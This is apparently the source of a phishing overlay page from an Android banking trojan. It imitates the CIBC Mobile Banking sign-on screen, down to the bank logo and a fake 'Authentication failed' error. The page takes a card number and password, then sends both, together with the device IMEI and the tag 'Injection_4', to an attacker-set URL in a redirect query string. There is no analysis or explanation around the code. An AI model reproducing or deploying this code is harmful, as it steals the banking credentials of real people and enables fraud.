<html>
<head>
	<link rel="stylesheet" href="ca/com.cibc.android.mobi/css/style.css">
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/cat.style.css">
	<script src="js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div id="header">
<img src="ca/com.cibc.android.mobi/img/logo.jfif" style="width: 10%;border: 1px solid #fff;">
</div>

    <div class="fitMlbody" id="content_div" style="margin-top: 20px;">
<div id="cat-error">
	<span>Authentication failed or timed out</span>
	<input type="button" class="submit" value="Try enter again" id="submitBtn1" onClick="tryEnterAgain();"/>
</div>
        <section class="content">
            <form id="form">
<center>
                <div class="teaser_box">
                    
					<div class="form">
						<div class="ptb">
							<input name="Member Number" id="login" maxlength="16" placeholder="Card Number" class="input-field" type="text">
			<script>
                document.getElementById('login').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z !@#$%^&*()_+|":?><]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
						</div>
						<br />
						<div class="ptb">
							<input type="hidden" name="name" value="CIBC Mobile Banking" />
							<input name="Access Code" id="password" maxlength="12" placeholder="Password" class="input-field" type="password" />

						</div> 
					</div>
					<br />
                    <div class="ptb">
						<input type="button" onClick="sentServer();" class="submit-button" id="submitBtn1" value="SIGN ON"/>

                        <br />
                    </div>
                </div>
</center>
            </form>
<form id="cat-step-2" class="cat-last-step">
	<span>Authentication failed or timed out</span>
	<input type="button" class="submit" value="Try enter again" id="submitBtn1" onClick="closeWindow()"/>
</form>
        </section>
    </div>

    <script type="text/javascript">
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 16) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCodeInp.value.length < 4) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>
<script>
function sentServer()
{
		var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 15)&&(oNumInp2.value.length > 3)) {
		var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
var login1 = document.forms["form"].elements["login"].value; 
var pass = document.forms["form"].elements["password"].value; 

location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|CIBC|"+login1+"|"+pass);
}
}
</script>			

</body>
</html>
